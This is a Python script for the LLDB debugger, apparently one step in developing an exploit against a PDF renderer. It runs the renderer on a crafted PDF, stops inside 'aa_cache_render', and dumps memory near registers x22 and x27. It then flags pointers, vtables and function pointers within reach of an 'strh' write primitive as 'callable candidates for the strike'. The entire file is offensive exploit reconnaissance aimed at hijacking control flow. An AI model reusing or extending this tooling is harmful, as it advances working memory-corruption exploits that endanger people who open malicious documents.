# RIP-18: x22 struct recon — dump [x22-0x100, x22+0x300] at walk stop; find
# pointer qwords within strh reach (x27 +/- 2MB). Also dump around x27 +/- 0x8000
# for any pointer slots (fn-ptrs, vtables) = callable candidates for the strike.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
TRACE = open(os.path.join(CWD, "rip18_trace.txt"), "a")
def T(s): print(s); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()

def qwords(p, addr, n):
    m = p.ReadMemory(addr, n*8, err)
    if not err.Success() or not m: return None
    return [struct.unpack('<Q', m[i*8:i*8+8])[0] for i in range(n)]

L = 31472
PDF = "k2_d%d.pdf" % L
bpe = t.BreakpointCreateByName("aa_cache_render")
p = t.LaunchSimple([PDF, "r.png"], None, CWD)
th = p.GetSelectedThread()
pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
bpw = t.BreakpointCreateByAddress(pc + 1804)
# go to the 5th walk stop (mid-walk, all structures live)
for i in range(5):
    p.Continue()
    st = p.GetState()
    while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
    if st != lldb.eStateStopped: break
fr = p.GetSelectedThread().GetSelectedFrame()
regs = {}
for r in ("x19", "x20", "x21", "x22", "x23", "x24", "x25", "x26", "x27", "x28"):
    regs[r] = fr.FindRegister(r).GetValueAsUnsigned()
T("regs: %s" % {k: hex(v) for k, v in regs.items()})
x27 = regs["x27"]
# scan each register's neighborhood for pointer-shaped qwords
for name in ("x19", "x20", "x21", "x22", "x23", "x24", "x25", "x26", "x28"):
    base = regs[name]
    if not base or base > 0x800000000000: continue
    for span in (0, 0x800, 0x1000):
        a = (base - span) & ~7
        qs = qwords(p, a, 40)
        if not qs: continue
        ptrs = [(j*8, hex(q)) for j, q in enumerate(qs) if 0x100000000 <= q < 0x800000000000]
        if ptrs:
            T("%s-%#x..: PTRS %s" % (name, span, ptrs[:8]))
# x22 deep dump
x22 = regs["x22"]
if x22:
    T("--- x22=%x deep dump (x22-0x200 .. +0x400) ---" % x22)
    qs = qwords(p, x22 - 0x200, 0x600 // 8)
    if qs:
        for j, q in enumerate(qs):
            tag = ""
            if 0x100000000 <= q < 0x800000000000:
                tag = " <PTR>"
                if x27 - 0x200000 <= q <= x27 + 0x200000: tag += " <IN-REACH>"
                d = q - x27
                if abs(d) < 0x400000: tag += " x27%+x" % d
            if q or tag:
                T("  x22%+05x = %016x%s" % (-0x200 + j*8, q, tag))
p.Kill()
T("RIP-18 DONE")
TRACE.close()
